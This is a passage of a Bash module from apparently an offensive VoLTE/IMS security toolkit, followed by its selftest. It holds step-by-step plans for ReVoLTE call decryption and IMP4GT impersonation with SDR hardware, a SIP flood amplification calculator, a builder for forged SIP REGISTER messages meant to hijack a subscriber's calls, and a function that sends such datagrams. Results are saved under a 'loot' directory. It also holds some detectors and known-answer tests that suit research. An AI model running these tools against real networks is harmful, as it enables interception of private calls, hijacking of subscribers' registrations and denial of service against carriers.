            local dg; dg=$(vims_py digest "$auser" "$arealm" "$res" REGISTER "$auri" "$anonce" "$anc" "$acnonce" "$aqop") || return 1
            local want; want=$(vims_fld "$dg" response)
            printf 'expected_response\t%s\n' "$want"
            if [[ "$want" == "$aresp" ]]; then
                printf 'digest_check\tmatch\n'
            else
                printf 'digest_check\tmismatch\n'
            fi
        else
            printf 'digest_check\tnot_attempted\n'
            printf 'note\t%s\n' "the AKA RES is not in the SIP message: it is produced by the USIM with Milenage f2 (K, RAND) and never leaves the card, so pass it as the optional second argument to check the RFC 3310/2617 digest"
        fi
    fi
    printf 'algorithm\t%s\n' "AKAv1-MD5 (RFC 3310) over the HTTP-like Digest of RFC 2617"
    return 0
}

# ── plans (handoff) ─────────────────────────────────────────────────────
vims_plan() {
    local kind="${1:-}"
    case "$kind" in
        revolte-capture|imp4gt-lab) ;;
        *) printf 'ERROR\tunknown plan: %s (want revolte-capture|imp4gt-lab)\n' "${kind:-<none>}" >&2; return 2 ;;
    esac
    local ts f
    ts=$(date +%Y%m%d_%H%M%S)
    mkdir -p "$VIMS_PLAN_DIR"
    f="$VIMS_PLAN_DIR/plan_${kind}_${ts}.txt"
    {
        echo "plan: $kind"
        echo "status: handoff"
        if [[ "$kind" == "revolte-capture" ]]; then
            echo "hardware: a receive-only SDR (USRP B210, LimeSDR, or HackRF) with a stable clock, srsRAN or srsUE for the radio stack, and a VoLTE-capable test UE whose calls you are authorised to capture"
        else
            echo "hardware: a full-duplex SDR (USRP B210 or LimeSDR) with a GPSDO, srsRAN or a modified srsUE, and a licensed or Faraday-isolated test cell; a layer-2 position is required"
        fi
        echo "ts: $(date -Is)"
        echo
        if [[ "$kind" == "revolte-capture" ]]; then
            cat <<'EOF'
objective
  Capture two VoLTE calls that reuse the same radio resources so the same
  keystream is applied twice, then decrypt the second with the first
  (ReVoLTE, Rupprecht et al., USENIX Security 2020).

why this needs hardware
  The keystream is a function of the radio-layer cipher key and the PDCP
  COUNT, which are established during RRC/NAS setup. The reuse happens when
  the network allocates the same RLC/MAC resources for a second call. Only a
  radio receiver on the target cell can see the ciphertext and the setup.

prerequisites
  * a receive-only SDR on the target downlink, with the cell's EARFCN
  * srsRAN or srsUE with a PDCP capture hook, or an IQ recorder plus a
    PDCP decoder
  * two calls from the same subscriber close together, which is what the
    network must allocate identically for the attack to apply

procedure
  1. Record the setup of call A and the whole of call A.
  2. Record call B, which reuses the resources.
  3. Feed the two ciphertext streams to the detector:
       modules/30_volte_ims.sh --detect-keystream-reuse calls.pcap
  4. If reuse is reported, recover the keystream from a known-plaintext
     segment of call A (for example a recorded announcement or the ring-back)
     and decrypt call B:
       modules/30_volte_ims.sh --keystream-recover <ctB> <knownA> <ctB2>
  5. The precondition is not guaranteed: if the allocation differs, the
     keystreams differ and the detector says so. There is no fallback.
EOF
        else
            cat <<'EOF'
objective
  Reproduce IMP4GT (Rupprecht et al., NDSS 2020): show that the LTE
  lower-layer identity mapping is not anchored at the mutually authenticated
  layer, so an attacker with a layer-2 position can impersonate the UE toward
  the network and the network toward the UE.

why this needs hardware
  The attack lives in the PHY/MAC: it needs a transmitter that can place
  uplink bursts in the victim's grant with the victim's RNTI and the right
  timing advance, and a receiver for the downlink. That layer-2 position
  cannot be reached from software alone.

prerequisites
  * a full-duplex SDR with a stable clock (GPSDO), USRP B210 or LimeSDR
  * srsRAN or a modified srsUE to drive the PHY/MAC and set the RNTI
  * a licensed or Faraday-isolated test cell, and a test UE you own
  * a layer-2 position: the attacker must be able to transmit on the cell

procedure
  1. Camp on the cell and recover the victim's C-RNTI from the downlink.
  2. Acquire the uplink timing advance for the victim's grant.
  3. Transmit uplink user-plane data with the victim's RNTI (uplink
     impersonation) and observe the network accepting it as the victim.
  4. Present downlink data to the victim as if from the eNB (downlink
     impersonation).
  5. The two directions together are the bidirectional impersonation.
EOF
        fi
    } | tee "$f"
    printf 'plan_file\t%s\nstatus\thandoff\n' "$f"
    return 0
}

# ── status ──────────────────────────────────────────────────────────────
vims_cli_status_tsv() {
    local py="none" crypt="none" radio="none"
    if command -v python3 >/dev/null 2>&1; then
        py="python3"
        crypt=$(python3 -c 'import cryptography; print(cryptography.__version__)' 2>/dev/null || echo none)
    fi
    command -v hackrf_info >/dev/null 2>&1 && radio="hackrf"
    [[ "$radio" == "none" ]] && command -v uhd_find_devices >/dev/null 2>&1 && radio="usrp"
    [[ "$radio" == "none" ]] && command -v LimeUtil >/dev/null 2>&1 && radio="limesdr"
    printf 'module\tvolte_ims\n'
    printf 'tag\tvims\n'
    printf 'python3\t%s\n' "$py"
    printf 'cryptography\t%s\n' "$crypt"
    printf 'radio\t%s\n' "$radio"
    printf 'dir\t%s\n' "$VIMS_DIR"
    printf 'plan_dir\t%s\n' "$VIMS_PLAN_DIR"
    printf 'revolte\t%s\n' "implemented in software (AES-CTR keystream reuse)"
    printf 'imp4gt\t%s\n' "model only; transmit needs a layer-2 position (handoff)"
    printf 'nist_vector\t%s\n' "SP 800-38A F.5.1 CTR-AES128.Encrypt"
    printf 'rfc_vector\t%s\n' "RFC 2617 3.5 Digest example"
}

# ── selftest ────────────────────────────────────────────────────────────
# ── SIP flooding / amplification (IEEE TQ 2024) ─────────────────────────
vims_sip_flood() {
    local method="${1:-INVITE}" rate="${2:-100}" req="${3:-400}" resp="${4:-1600}"
    [[ "$method" =~ ^[A-Za-z]+$ ]] || { printf 'ERROR\tmethod must be a token\n' >&2; return 2; }
    local m=${method^^} v
    for v in "$rate" "$req" "$resp"; do [[ "$v" =~ ^[0-9]+$ ]] || { printf 'ERROR\tnumeric rate/sizes expected\n' >&2; return 2; }; done
    awk -v m="$m" -v r="$rate" -v q="$req" -v s="$resp" 'BEGIN{
        amp = q>0 ? s/q : 0
        printf "method\t%s\nrate_rps\t%d\nrequest_bytes\t%d\nresponse_bytes\t%d\namplification\t%.2f\n", m, r, q, s, amp
        printf "bytes_per_s\t%d\n", r*(q+s)
    }'
    printf 'attack\tSIP %s flood: unauthenticated requests force per-request processing; the response size sets the amplification the origin absorbs\n' "$m"
}
# ── IMEI / location leakage over VoLTE SIP ──────────────────────────────
vims_imei_leak() {
    local msg="${1:-}"
    [[ -n "$msg" ]] || { printf 'ERROR\tusage: --imei-leak <sip-message-text>\n' >&2; return 2; }
    printf 'finding\tseverity\tdetail\n'
    local n=0
    if printf '%s' "$msg" | grep -Eq '[0-9]{15}'; then
        printf 'imei_exposed\tHIGH\ta 15-digit IMEI appears in the SIP signalling — IMSI/IMEI disclosure over the voice control plane\n'; n=$(( n + 1 ))
    fi
    if printf '%s' "$msg" | grep -Eqi 'P-Access-Network-Info'; then
        printf 'location_exposed\tHIGH\tP-Access-Network-Info present — the message carries the cell the UE is on\n'; n=$(( n + 1 ))
    fi
    if printf '%s' "$msg" | grep -Eqi 'User-Agent:.*(IMS|Android|iOS|Gm)'; then
        printf 'device_fingerprint\tMEDIUM\tUser-Agent discloses the device/stack, useful for targeting\n'; n=$(( n + 1 ))
    fi
    (( n == 0 )) && printf 'none\tINFO\tno IMEI, location or device fingerprint in the signalling\n'
    printf 'findings\t%d\n' "$n"
}
# ── SIP REGISTER spoof (registration hijack) ────────────────────────────
vims_register_spoof() {
    local impi="${1:-310150123456789@ims.mnc001.mcc310.3gppnetwork.org}" \
          contact="${2:-310150123456789@10.0.0.9}" \
          host="${3:-10.0.0.9}" \
          domain="${4:-ims.mnc001.mcc310.3gppnetwork.org}"
    [[ -n "$impi" && -n "$contact" ]] || { printf 'ERROR\tIMPI and contact required\n' >&2; return 2; }
    # One builder for one message. The old body wrote its own LF-terminated
    # lines and then printed a note on the SAME stream while Content-Length
    # said 0, so the note travelled inside the datagram as if it were SIP: a
    # reader stopped at byte 0 of the body and the rest was ignored, or a
    # reader took the whole datagram and saw a message nothing else parses.
    # stdout is now the message and nothing else; the note goes to stderr.
    local callid
    callid="$(printf '%08x%08x' "$RANDOM" "$RANDOM")@$host"
    vims_py sipbuild register \
        "impi=$impi" "contact=$contact" "host=$host" "domain=$domain" \
        "pai=$impi" "callid=$callid" || return 2
    printf 'attack\tSIP REGISTER with a forged Contact — binds the subscriber identity to an attacker endpoint, hijacking inbound calls and messages\n' >&2
}

vims_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export VIMS_DIR="$d/loot/volte_ims"
    export VIMS_PLAN_DIR="$VIMS_DIR/plans"
    mkdir -p "$VIMS_DIR" "$VIMS_PLAN_DIR"

    # 0. Crypto backend present.
    chk crypto-backend "$(command -v python3 >/dev/null 2>&1 && python3 -c 'import cryptography' 2>/dev/null && echo yes || echo no)" "yes"

    # 1. AES-CTR known-answer test: NIST SP 800-38A, F.5.1 CTR-AES128.Encrypt.
    #    Key 2b7e151628aed2a6abf7158809cf4f3c, initial counter block
    #    f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff, four plaintext blocks, ciphertext
    #    874d6191b620e3261bef6864990db6ce 9806f66b7970fdff8617187bb9fffdff
    #    5ae4df3edbd5d35e5b4f09020db03eab 1e031dda2fbe03d1792170a0f3009cee
    local nist_pt="6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e5130c81c46a35ce411e5fbc1191a0a52eff69f2445df4f9b17ad2b417be66c3710"
    local nist_ct="874d6191b620e3261bef6864990db6ce9806f66b7970fdff8617187bb9fffdff5ae4df3edbd5d35e5b4f09020db03eab1e031dda2fbe03d1792170a0f3009cee"
    chk nist-ctr-aes128 "$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$nist_pt")" "$nist_ct"

    # 2. ReVoLTE XOR identity with a worked example: two known plaintexts
    #    encrypted under one keystream; the XOR of the ciphertexts is the XOR
    #    of the plaintexts and the keystream decrypts both.
    local p1="48656c6c6f20566f4c544520414d5221" p2="414d522073696c656e6365206672616d"
    out=$(vims_cmd_revolte_demo "$p1" "$p2"); rc=$?
    chk revolte-rc "$rc" "0"
    chk revolte-xor-identity "$(fld "$out" xor_identity)" "match"
    chk revolte-xor-c-eq-p "$(fld "$out" xor_ciphertexts)" "$(fld "$out" xor_plaintexts)"
    chk revolte-ks-match "$(fld "$out" keystream_match)" "yes"
    chk revolte-recovered "$(fld "$out" recovered_match)" "yes"
    chk revolte-recovered-value "$(fld "$out" recovered_plaintext2)" "$p2"
    chk revolte-status "$(fld "$out" status)" "demonstrated"
    # same length enforced
    chk revolte-unequal "$(vims_cmd_revolte_demo "$p1" "aabb" >/dev/null 2>&1; echo $?)" "1"
    chk revolte-bad-hex "$(vims_cmd_revolte_demo "zz" "$p2" >/dev/null 2>&1; echo $?)" "2"
    chk revolte-missing "$(vims_cmd_revolte_demo "$p1" >/dev/null 2>&1; echo $?)" "2"

    # 3. Keystream recovery. Build c1/c2 under the published NIST keystream and
    #    recover p2 from a known plaintext of c1.
    #    The keystream is the NIST CTR stream; c1 = p1 XOR ks, c2 = p2 XOR ks.
    local ks=""
    ks=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff \
        "00000000000000000000000000000000")
    local c1 c2
    c1=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$p1")
    c2=$(vims_py ctr 2b7e151628aed2a6abf7158809cf4f3c f0f1f2f3f4f5f6f7f8f9fafbfcfdfeff "$p2")
    # with the full known plaintext the second stream is recovered entirely
    out=$(vims_cmd_keystream_recover "$c1" "$p1" "$c2"); rc=$?
    chk ksr-rc "$rc" "0"
    chk ksr-status-complete "$(fld "$out" status)" "complete"
    chk ksr-keystream "$(fld "$out" keystream)" "$ks"
    chk ksr-recovered-full "$(fld "$out" recovered_second)" "$p2"
    chk ksr-remainder-bytes "$(fld "$out" remainder_bytes)" "0"
    # with an 8-byte known-plaintext prefix only the prefix keystream is known;
    # the module must say so rather than guess the remainder
    local kp_pre="${p1:0:16}"
    out=$(vims_cmd_keystream_recover "$c1" "$kp_pre" "$c2")
    chk ksr-prefix-status "$(fld "$out" status)" "partial"
    chk ksr-prefix-bytes "$(fld "$out" keystream_bytes)" "8"
    chk ksr-prefix-recovered "$(fld "$out" recovered_second)" "${p2:0:16}"
    chk ksr-prefix-remainder "$(fld "$out" remainder_bytes)" "8"
    chk ksr-prefix-keystream "$(fld "$out" keystream)" "${ks:0:16}"
    chk ksr-bad-hex "$(vims_cmd_keystream_recover zz "$p1" >/dev/null 2>&1; echo $?)" "2"
    chk ksr-missing "$(vims_cmd_keystream_recover "$c1" >/dev/null 2>&1; echo $?)" "2"

    # 4. Keystream-reuse detector: two calls, never one call's two legs.
    local k
    for k in reuse noreuse shifted reverse bare mixed; do
        vims_py mkfixture "$d/$k.pcap" "$k"
    done
    printf 'call\tssrcs\tmedia_endpoints\tsip_call_id\n0\t11111111,22222222\t\tcall-one\n' \
        > "$d/one-call.tsv"

    out=$(vims_cmd_detect_reuse "$d/reuse.pcap"); rc=$?
    chk reuse-rc "$rc" "0"
    chk reuse-fires "$(fld "$out" status)" "keystream_reuse"
    chk reuse-streams "$(fld "$out" ciphertext_streams)" "2"
    chk reuse-ssrc-a "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stream.0"{print ($2 ~ /11111111/)}')" "1"
    chk reuse-ssrc-b "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stream.1"{print ($2 ~ /22222222/)}')" "1"
    chk reuse-aligned "$(fld "$out" finding.0.aligned_frames)" "12"
    chk reuse-fired "$(fld "$out" finding.0.fired_frames)" "12"
    chk reuse-run "$(fld "$out" finding.0.longest_run)" "144"

    out=$(vims_cmd_detect_reuse "$d/noreuse.pcap")
    chk noreuse-clean "$(fld "$out" status)" "no_reuse"
    chk noreuse-pairs "$(fld "$out" pairs_compared)" "1"

    # The same keystream one frame out of step: reuse of the generator, not of
    # the position, so an index-aligned comparison must stay clean.
    out=$(vims_cmd_detect_reuse "$d/shifted.pcap")
    chk shifted-clean "$(fld "$out" status)" "no_reuse"

    # One call, both legs fed the same keystream on purpose. Two legs are two
    # keys; a detector that compares them reports its own fixture.
    out=$(vims_cmd_detect_reuse "$d/reverse.pcap")
    chk reverse-clean "$(fld "$out" status)" "no_reuse"
    chk reverse-excluded "$(fld "$out" excluded_reverse)" "1"
    chk reverse-pairs "$(fld "$out" pairs_compared)" "0"

    # No RTP header at all, and some ciphertext octets that happen to look like
    # one: shape must be corroborated by counting sequence numbers.
    out=$(vims_cmd_detect_reuse "$d/bare.pcap")
    chk bare-fires "$(fld "$out" status)" "keystream_reuse"
    chk bare-streams "$(fld "$out" ciphertext_streams)" "2"
    chk bare-ambiguous "$(fld "$out" ambiguous_rtp)" "6"

    # Two calls multiplexed on one five-tuple: one stream each, by SSRC.
    out=$(vims_cmd_detect_reuse "$d/mixed.pcap")
    chk mixed-fires "$(fld "$out" status)" "keystream_reuse"
    chk mixed-streams "$(fld "$out" ciphertext_streams)" "2"

    # With a calls table, two streams of the same call are not two calls.
    out=$(vims_cmd_detect_reuse "$d/reuse.pcap" 0 --calls "$d/one-call.tsv")
    chk samecall-clean "$(fld "$out" status)" "no_reuse"
    chk samecall-excluded "$(fld "$out" excluded_same_call)" "1"
    chk samecall-rows "$(fld "$out" calls_rows)" "1"

    chk reuse-bad-pcap "$(vims_cmd_detect_reuse /nonexistent.pcap >/dev/null 2>&1; echo $?)" "1"
    chk reuse-bad-port "$(vims_cmd_detect_reuse "$d/reuse.pcap" xx >/dev/null 2>&1; echo $?)" "2"
    chk reuse-bad-tag "$(vims_cmd_detect_reuse "$d/reuse.pcap" 0 --tag xx >/dev/null 2>&1; echo $?)" "2"
    chk reuse-missing-calls "$(vims_cmd_detect_reuse "$d/reuse.pcap" 0 --calls /nonexistent.tsv >/dev/null 2>&1; echo $?)" "1"

    # 5. SIP parse on a real REGISTER.
    local reg hex
    reg=$(vims_py msgs register)
    out=$(vims_cmd_sip_parse "$reg"); rc=$?
    chk sip-register-rc "$rc" "0"
    chk sip-register-type "$(fld "$out" type)" "request"
    chk sip-register-method "$(fld "$out" method)" "REGISTER"
    chk sip-register-uri "$(fld "$out" request_uri)" "sip:ims.mnc001.mcc310.3gppnetwork.org"
    chk sip-register-via-count "$(fld "$out" via_count)" "1"
    chk sip-register-from "$([[ "$(fld "$out" from)" == *310150123456789* ]] && echo yes || echo no)" "yes"
    chk sip-register-to "$([[ "$(fld "$out" to)" == *310150123456789* ]] && echo yes || echo no)" "yes"
    chk sip-register-contact "$([[ "$(fld "$out" contact)" == *"2001:db8::1"* ]] && echo yes || echo no)" "yes"
    chk sip-register-cseq "$(fld "$out" cseq)" "1 REGISTER"
    chk sip-register-expires "$(fld "$out" expires)" "600000"
    # INVITE with SDP
    hex=$(vims_py msgs invite)
    out=$(vims_cmd_sip_parse "$hex")
    chk sip-invite-method "$(fld "$out" method)" "INVITE"
    chk sip-invite-sdp-ver "$(fld "$out" sdp_version)" "0"
    chk sip-invite-sdp-media "$(fld "$out" sdp_media)" "audio 49152 RTP/AVP 97 98"
    chk sip-invite-sdp-rtpmap "$(fld "$out" sdp_rtpmap)" "97 AMR/8000,98 AMR-WB/16000"
    chk sip-invite-sdp-conn "$(fld "$out" sdp_connection)" "IN IP6 2001:db8::1"
    chk sip-bad-hex "$(vims_cmd_sip_parse zz >/dev/null 2>&1; echo $?)" "2"
    chk sip-missing "$(vims_cmd_sip_parse >/dev/null 2>&1; echo $?)" "2"
    # a tab inside a header value must not forge a TSV field
    local tabmsg tabhex
    tabmsg=$(printf 'REGISTER sip:x SIP/2.0\r\nFrom: <sip:a@b>\t;tag=1\r\nTo: <sip:a@b>\r\nContent-Length: 0\r\n\r\n')
    tabhex=$(printf '%s' "$tabmsg" | vims_hex_of)
    chk sip-tab-sanitised "$(vims_cmd_sip_parse "$tabhex" | awk -F'\t' 'NF!=2{n++} END{print n+0}')" "0"

    # ── the media leg ───────────────────────────────────────────────────
    # The offer first: a call that cannot say what audio it speaks is a call
    # that connects and stays silent. PCMU and PCMA are listed before AMR
    # because those are the two this leg can encode and decode.
    hex=$(vims_py sipbuild invite rtp_port=40000 media_ip=127.0.0.1 | vims_hex_of)
    out=$(vims_cmd_sip_parse "$hex")
    chk offer-media   "$(fld "$out" sdp_media)"  "audio 40000 RTP/AVP 0 8 96"
    chk offer-rtpmap  "$(fld "$out" sdp_rtpmap)" "0 PCMU/8000,8 PCMA/8000,96 AMR/8000"

    # G.711 known answers: the reference codes every implementation agrees on
    # (full scale is 32767 and -32768, written here little-endian).
    chk g711-ulaw-zero "$(vims_py g711 PCMU encode 0000 | awk -F'\t' '$1=="out"{print $2}')" "ff"
    chk g711-ulaw-max  "$(vims_py g711 PCMU encode ff7f | awk -F'\t' '$1=="out"{print $2}')" "80"
    chk g711-ulaw-min  "$(vims_py g711 PCMU encode 0080 | awk -F'\t' '$1=="out"{print $2}')" "00"
    chk g711-alaw-zero "$(vims_py g711 PCMA encode 0000 | awk -F'\t' '$1=="out"{print $2}')" "d5"
    chk g711-alaw-max  "$(vims_py g711 PCMA encode ff7f | awk -F'\t' '$1=="out"{print $2}')" "aa"
    chk g711-ulaw-dec  "$(vims_py g711 PCMU decode ff | awk -F'\t' '$1=="out"{print $2}')" "0000"

    # The same thing against an implementation that is not this one: audioop
    # was the reference codec in the Python standard library for years. When it
    # is gone (3.13) this reports SKIP — a skip is never a pass.
    local ramp ulaw_ref alaw_ref n
    ramp=$(python3 -c 'import struct,sys; sys.stdout.write(struct.pack("<8h",0,1,-1,100,-100,1000,-1000,32767).hex())')
    ulaw_ref=$(python3 -c 'import audioop,struct,sys; sys.stdout.write(audioop.lin2ulaw(bytes.fromhex(sys.argv[1]),2).hex())' "$ramp" 2>/dev/null)
    alaw_ref=$(python3 -c 'import audioop,struct,sys; sys.stdout.write(audioop.lin2alaw(bytes.fromhex(sys.argv[1]),2).hex())' "$ramp" 2>/dev/null)
    if [[ -n "$ulaw_ref" ]]; then
        chk g711-ulaw-audioop "$(vims_py g711 PCMU encode "$ramp" | awk -F'\t' '$1=="out"{print $2}')" "$ulaw_ref"
        chk g711-alaw-audioop "$(vims_py g711 PCMA encode "$ramp" | awk -F'\t' '$1=="out"{print $2}')" "$alaw_ref"
        chk g711-ulaw-decode-audioop \
            "$(vims_py g711 PCMU decode "$ulaw_ref" | awk -F'\t' '$1=="out"{print $2}')" \
            "$(python3 -c 'import audioop,sys; sys.stdout.write(audioop.ulaw2lin(bytes.fromhex(sys.argv[1]),2).hex())' "$ulaw_ref" 2>/dev/null)"
    else
        printf 'SKIP\tg711-referee\taudioop is not in this python (removed in 3.13)\n'
    fi
    chk g711-bad-codec "$(vims_cmd_g711 AMR encode 0000 >/dev/null 2>&1; echo $?)" "2"
    chk g711-bad-dir   "$(vims_cmd_g711 PCMU sideways 0000 >/dev/null 2>&1; echo $?)" "2"
    chk g711-odd-hex   "$(vims_cmd_g711 PCMU encode 000 >/dev/null 2>&1; echo $?)" "2"

    # 6. IMS registration flow: REGISTER -> 401 challenge -> authenticated
    #    REGISTER -> 200 OK, plus the RFC 2617 3.5 digest known answer.
    out=$(vims_cmd_ims_registration "$(vims_py msgs register)")
    chk ims-reg-step "$(fld "$out" flow_step)" "1_register_initial"
    out=$(vims_cmd_ims_registration "$(vims_py msgs challenge)")
    chk ims-401-step "$(fld "$out" flow_step)" "2_challenge"
    chk ims-401-realm "$(fld "$out" challenge_realm)" "ims.mnc001.mcc310.3gppnetwork.org"
    chk ims-401-nonce "$(fld "$out" challenge_nonce)" "Q2hhbGxlbmdl"
    chk ims-401-alg "$(fld "$out" challenge_algorithm)" "AKAv1-MD5"
    out=$(vims_cmd_ims_registration "$(vims_py msgs register_auth)")
    chk ims-auth-step "$(fld "$out" flow_step)" "3_register_authenticated"
    chk ims-auth-nonce "$(fld "$out" auth_nonce)" "Q2hhbGxlbmdl"
    chk ims-auth-digest-skipped "$(fld "$out" digest_check)" "not_attempted"
    out=$(vims_cmd_ims_registration "$(vims_py msgs ok)")
    chk ims-ok-step "$(fld "$out" flow_step)" "4_registered"
    # RFC 2617 section 3.5 worked example
    chk rfc2617-ha1 "$(vims_fld "$(vims_py digest 'Mufasa' 'testrealm@host.com' 'Circle Of Life' GET '/dir/index.html' 'dcd98b7102dd2f0e8b11d0f600bfb0c093' '00000001' '0a4f113b' 'auth')" ha1)" "939e7578ed9e3c518a452acee763bce9"
    chk rfc2617-response "$(vims_fld "$(vims_py digest 'Mufasa' 'testrealm@host.com' 'Circle Of Life' GET '/dir/index.html' 'dcd98b7102dd2f0e8b11d0f600bfb0c093' '00000001' '0a4f113b' 'auth')" response)" "6629fae49393a05397450978507c4ef1"
    chk ims-bad-hex "$(vims_cmd_ims_registration zz >/dev/null 2>&1; echo $?)" "2"
    chk ims-missing "$(vims_cmd_ims_registration >/dev/null 2>&1; echo $?)" "2"

    # 7. IMP4GT model: sequence, preconditions, layer-2 position, handoff.
    out=$(vims_imp4gt_model); rc=$?
    chk imp4gt-rc "$rc" "0"
    chk imp4gt-paper "$(printf '%s\n' "$out" | grep -ci 'NDSS 2020')" "1"
    chk imp4gt-status "$(printf '%s\n' "$out" | grep -c '^status	handoff')" "1"
    chk imp4gt-layer2 "$([[ "$(printf '%s\n' "$out" | grep -ci 'layer-2 position')" -ge 1 ]] && echo yes || echo no)" "yes"
    chk imp4gt-bidirectional "$(printf '%s\n' "$out" | grep -ci 'downlink impersonation')" "1"
    chk imp4gt-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR')" -ge 1 ]] && echo yes || echo no)" "yes"

    # 8. Plans: handoff, radio named, layer-2 position named for IMP4GT.
    out=$(vims_plan revolte-capture)
    chk plan-revolte-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    chk plan-revolte-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR\|HackRF')" -ge 1 ]] && echo yes || echo no)" "yes"
    out=$(vims_plan imp4gt-lab)
    chk plan-imp4gt-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    chk plan-imp4gt-radio "$([[ "$(printf '%s\n' "$out" | grep -ci 'USRP\|LimeSDR')" -ge 1 ]] && echo yes || echo no)" "yes"
    local pf; pf=$(find "$VIMS_PLAN_DIR" -name 'plan_imp4gt-lab_*.txt' | head -n1)
    chk plan-imp4gt-layer2 "$([[ "$(grep -ci 'layer-2 position' "$pf")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-imp4gt-file-status "$(grep -c '^status: handoff' "$pf")" "1"
    chk plan-unknown "$(vims_plan nope >/dev/null 2>&1; echo $?)" "2"

    # 9. Status TSV invariants.
    out=$(vims_cli_status_tsv)
    chk status-dir "$(fld "$out" dir)" "$VIMS_DIR"
    chk status-tag "$(fld "$out" tag)" "vims"

    # 10. SIP flooding / leakage / REGISTER spoof.
    out=$(vims_sip_flood INVITE 100 400 1600)
    chk flood-method "$(fld "$out" method)" "INVITE"
    chk flood-amp "$(fld "$out" amplification)" "4.00"
    chk flood-bad "$(vims_sip_flood 'BAD METHOD' 1 1 1 >/dev/null 2>&1; echo $?)" "2"
    chk imei-exposed "$(vims_imei_leak 'User-Agent: IMS 353285060000001' | awk -F'\t' '$1=="imei_exposed"{print $2}')" "HIGH"
    chk imei-loc "$(vims_imei_leak 'P-Access-Network-Info: 3GPP-E-UTRAN-FDD;cell=310260' | awk -F'\t' '$1=="location_exposed"{print $2}')" "HIGH"
    chk imei-clean "$(vims_imei_leak 'INVITE sip:x SIP/2.0' | awk -F'\t' '$1=="none"{print $2}')" "INFO"
    out=$(vims_register_spoof)
    chk reg-spoof "$(printf '%s' "$out" | grep -c '^REGISTER sip:')" "1"
    chk reg-contact "$(printf '%s' "$out" | grep -c '^Contact:')" "1"
    chk reg-pai "$(printf '%s' "$out" | grep -c '^P-Asserted-Identity:')" "1"
    # The message is wire; the note about it is not. These four arms exist
    # because the old body put both on stdout while Content-Length said 0.
    chk reg-wire-end "$(vims_register_spoof | python3 -c 'import sys;d=sys.stdin.buffer.read();print(d[-4:].hex())')" "0d0a0d0a"
    chk reg-wire-lf "$(vims_register_spoof | python3 -c 'import sys;d=sys.stdin.buffer.read();print(d.count(b"\n")-d.count(b"\r\n"))')" "0"
    chk reg-wire-note "$(printf '%s' "$out" | grep -c '^attack')" "0"
    chk reg-note-stderr "$(vims_register_spoof 2>&1 >/dev/null | grep -c '^attack')" "1"
    chk reg-cl-zero "$(printf '%s' "$out" | grep -c '^Content-Length: 0')" "1"

    # 11. Sending: the authority flag is the gate, and a datagram really
    #     leaves the process. A loopback listener is the proof: it reads the
    #     bytes that arrived and the assertions below read them back.
    chk send-no-gate "$(vims_sip_send 127.0.0.1:99999 register >/dev/null 2>&1; echo $?)" "2"
    chk send-no-flag-needed "$(sout2=$(vims_sip_send "127.0.0.1:9" register 2>/dev/null); printf '%s\n' "$sout2" | grep -c '^gate')" "1"
    chk send-bad-port "$(vims_sip_send 127.0.0.1:99999 register >/dev/null 2>&1; echo $?)" "2"
    local lport recv lpid sout
    lport=$(( 20000 + RANDOM % 20000 ))
    recv="$d/recv.bin"
    cat > "$d/listen.py" <<'PYL'
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", int(sys.argv[1])))
s.settimeout(10)
data, peer = s.recvfrom(65535)
open(sys.argv[2], "wb").write(data)
PYL
    python3 "$d/listen.py" "$lport" "$recv" &
    lpid=$!
    sleep 0.3
    sout=$(vims_sip_send "127.0.0.1:$lport" register 2>/dev/null)
    wait "$lpid" 2>/dev/null || true
    chk send-status "$(fld "$sout" status)" "sent-no-answer"
    chk send-bytes "$(fld "$sout" sent_bytes)" "$(stat -c%s "$recv" 2>/dev/null || echo missing)"
    chk send-start "$(head -c 8 "$recv" 2>/dev/null)" "REGISTER"
    chk send-end "$(tail -c 4 "$recv" 2>/dev/null | od -An -tx1 | tr -d ' \n')" "0d0a0d0a"
    chk send-crlf "$(python3 -c 'import sys;d=open(sys.argv[1],"rb").read();print(d.count(b"\n")-d.count(b"\r\n"))' "$recv" 2>/dev/null)" "0"

    # 12. AKAv1-MD5: RES comes from Milenage on the 3GPP TS 35.208 test set 1
    #     vector, and the digest is pinned by RFC 2617 3.5's published vector.
    #     cnonce is fixed so the response is reproducible.
    local aka_fix aka_nonce aka_err aka_out aka_resp aka_raw
    aka_fix="k=465b5ce8b199b49faa5f0a2ee238a6bc op=cdc202d5123e20f62b6d676ac72cb318 rand=23553cbe9637a89d218ae64dae47bf35 cnonce=0a4f113b"
    aka_nonce=$(python3 -c 'import base64;print(base64.b64encode(bytes.fromhex("23553cbe9637a89d218ae64dae47bf35")+bytes(16)).decode())')
    aka_err="$d/aka.err"
    aka_out=$(vims_register_aka $aka_fix nonce="$aka_nonce" 2>"$aka_err")
    chk aka-rc "$?" "0"
    chk aka-res "$(awk -F'\t' '$1=="res"{print $2}' "$aka_err")" "a54211d5e3ba50bf"
    chk aka-nonce-rand "$(awk -F'\t' '$1=="nonce_carries_rand"{print $2}' "$aka_err")" "yes"
